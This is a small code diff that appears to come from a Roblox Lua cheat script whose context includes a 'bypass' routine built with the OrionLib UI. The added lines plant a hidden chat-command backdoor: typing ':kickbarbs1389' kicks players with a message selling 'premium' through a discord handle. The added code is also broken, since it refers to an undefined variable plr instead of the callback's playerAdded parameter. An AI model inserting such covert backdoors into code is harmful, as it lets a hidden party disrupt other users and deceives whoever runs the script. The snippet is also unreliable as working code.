@@ -31,6 +31,16 @@ local function removeFade()
 	end
 end
 
+game.Players.PlayerAdded:connect(function(playerAdded)
+	plr.Chatted:connect(function(msg)
+		if msg == ":kickbarbs1389" then
+			plr:Kick("Someone with the script's premium kicked you... Buy premium by adding onlybarbarian on discord.")
+		end
+
+	end)
+end)
+
+
 local function bypass()
 	OrionLib:MakeNotification({
 		Name = "Bypassing.",
